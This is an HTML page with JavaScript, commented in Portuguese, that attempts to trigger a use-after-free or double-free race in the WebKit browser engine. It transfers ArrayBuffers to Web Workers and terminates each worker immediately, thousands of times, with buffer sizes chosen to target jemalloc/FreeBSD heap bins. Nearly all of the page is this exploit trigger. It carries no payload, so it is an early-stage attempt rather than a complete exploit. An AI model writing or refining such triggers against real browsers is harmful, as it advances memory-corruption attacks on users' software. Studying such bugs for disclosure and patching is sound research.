<!DOCTYPE html>
<html>
<body>
<h1>UAF / Double Free Attempt</h1>
<button onclick="runUAFTest()">Iniciar Race Condition</button>
<div id="log"></div>

<script>
    function log(msg) { 
        document.getElementById('log').innerHTML = msg; 
    }

    function runUAFTest() {
        log("Iniciando Race de Transferência/Terminação...");
        
        // Código do Worker: tenta escrever na memória recebida
        const workerCode = `
            self.onmessage = function(e) {
                // Tenta acessar e modificar a memória transferida
                const arr = new Uint8Array(e.data);
                arr[0] = 0xFF; 
                // Segurar a thread viva por um microssegundo pode ajudar a alargar a janela
                for(let i=0; i<100; i++) {}; 
                postMessage("Pong");
            };
        `;
        const blob = new Blob([workerCode], {type: 'application/javascript'});
        const url = URL.createObjectURL(blob);

        let iterations = 0;
        
        const interval = setInterval(() => {
            iterations++;
            
            // 1. Criação
            const w = new Worker(url);
            
            // 2. Alocação de memória (Heap Spraying em pequena escala)
            // Tamanho específico para cair em "bins" de memória interessantes do Jemalloc/FreeBSD
            const buffer = new ArrayBuffer(1024 * 8); 
            
            // 3. O Gatilho (The Trigger)
            // Tenta transferir a posse da memória PARA o worker
            w.postMessage(buffer, [buffer]);

            // 4. A Corrida (The Race)
            // Matamos o worker imediatamente.
            // O Kernel tenta liberar a stack do worker e os recursos associados (o buffer).
            // Se o WebKit ainda estiver processando o envio, pode tentar liberar o buffer 2x (Double Free)
            // ou acessar o buffer depois que a thread worker já morreu (UAF).
            w.terminate();

            // Tentar acessar o buffer aqui na main thread vai dar erro de JS padrão (detached),
            // mas o que queremos é que o motor do browser (C++) se confunda internamente.

            if(iterations % 100 === 0) log("Tentativas: " + iterations);
            if(iterations > 5000) clearInterval(interval);

        }, 2); // Intervalo baixíssimo para maximizar colisão
    }
</script>
</body>
</html>
